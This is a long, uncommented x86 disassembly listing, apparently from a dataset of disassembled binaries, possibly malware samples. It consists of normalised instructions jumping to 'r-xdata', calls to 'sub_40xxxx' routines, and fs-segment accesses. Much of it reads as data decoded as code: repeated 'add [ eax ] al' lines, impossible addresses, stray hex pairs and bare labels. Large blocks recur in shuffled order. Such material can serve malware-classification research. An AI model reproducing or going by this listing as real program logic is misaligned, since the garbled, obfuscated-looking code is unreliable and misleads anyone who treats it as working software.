jge r-xdata
call sub_403100
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100b566
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f40c
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c149bf
jae r-xdata
jpo 0x36288a05
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288a55
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba5aa
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13ba35
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40310d
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff8202aa6f
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85bb019
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14027
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_4030ef
jo 0xffffffffff29beb0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753de1
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_40310d
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_40313e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18ab6c8
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x10018d3
jne r-xdata
jpe 0x18c340aa
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec17337
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4c353
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e47a
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100b566
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f40c
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1ce5e
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c149bf
jae r-xdata
jpo 0x36288a05
jg r-xdata
jge 0xffffffffc009a6de
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288a55
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe24a497
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba5aa
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13ba35
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc64762c
mov eax 0xff64870f
jge r-xdata
call sub_403100
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_40313e
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec150ed
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85bb019
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18ab6c8
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14027
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x10018d3
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_4030ef
jo 0xffffffffff29beb0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753de1
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_40310d
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100b566
jns r-xdata
add esi 0x99870f
push esi
call sub_40313e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f40c
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c340aa
call 0xffffffffcec17337
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4c353
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e47a
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c149bf
jae r-xdata
jpo 0x36288a05
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288a55
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1ce5e
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba5aa
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13ba35
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc009a6de
mov eax 0xff64870f
jg r-xdata
jl 0xe24a497
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc64762c
jge r-xdata
call sub_403100
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_4031bd
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c1f40c
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b566
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jae r-xdata
jpo 0x36288a05
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c149bf
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7288a55
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba5aa
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13ba35
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_4031ea
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120b503
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb4dc
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f40c
ja r-xdata
jmp 0xffffffffe7288a55
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288a05
jno r-xdata
jno 0xffffffffff13ba35
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c149bf
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba5aa
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b566
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40323a
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f40c
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288a05
jg r-xdata
jge 0xffffffffe1c149bf
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba5aa
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7288a55
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13ba35
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100b566
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_40326c
jg r-xdata
push ecx
push edi
call sub_4032ec
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f40c
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288a05
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7288a55
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13ba35
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c149bf
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba5aa
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b566
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4032c8
jae r-xdata
push esp
push edx
call sub_40323a
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120b503
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb4dc
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
